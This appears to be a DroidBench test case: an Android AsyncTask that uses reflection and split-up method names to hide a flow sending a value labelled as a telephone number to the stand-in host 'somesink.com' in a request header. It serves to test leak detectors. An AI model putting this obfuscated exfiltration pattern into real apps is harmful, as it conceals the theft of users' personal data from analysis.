package com.example.network_reflection;


import java.lang.reflect.Constructor;

import java.lang.reflect.Method;


import org.json.JSONObject;

import android.os.AsyncTask;

public class NetworkClass extends AsyncTask{

	@SuppressWarnings({ "unchecked", "rawtypes" })
	@Override
	protected Object doInBackground(Object... params) {
		try {
			Class c = Class.forName("com.example.network_reflection.ConcreteClass");
			Object o = c.newInstance();
			Method m = c.getDeclaredMethod("setLine".concat("1"), String.class);
			m.invoke(o,params[0].toString());
			
			Method m2 = c.getMethod("getUncritical");
			String s = (String) m2.invoke(o);
			
			
			Class cl = Class.forName("java.net.URL");
			
			
			Constructor ctor = cl.getConstructor(String.class);
			Object obj = ctor.newInstance(new Object[] { "https://somesink.com" });
			
			Method m3 = cl.getDeclaredMethod("openConnect".concat("ion"));
			Object ob = m3.invoke(obj);
			
			Class cls = Class.forName("java.net.URLConnection");
						
			Method m4 = cls.getDeclaredMethod("setRequestProperty",String.class,String.class);
			m4.invoke(ob, "Telephone number", s);
			android.util.Log.i("DroidBench", "Sending the getLine1Number " + s + " completed");

		} catch (Exception e) {
			android.util.Log.e("DroidBench", "Exception", e);
		}
		return null;
	}
	

}
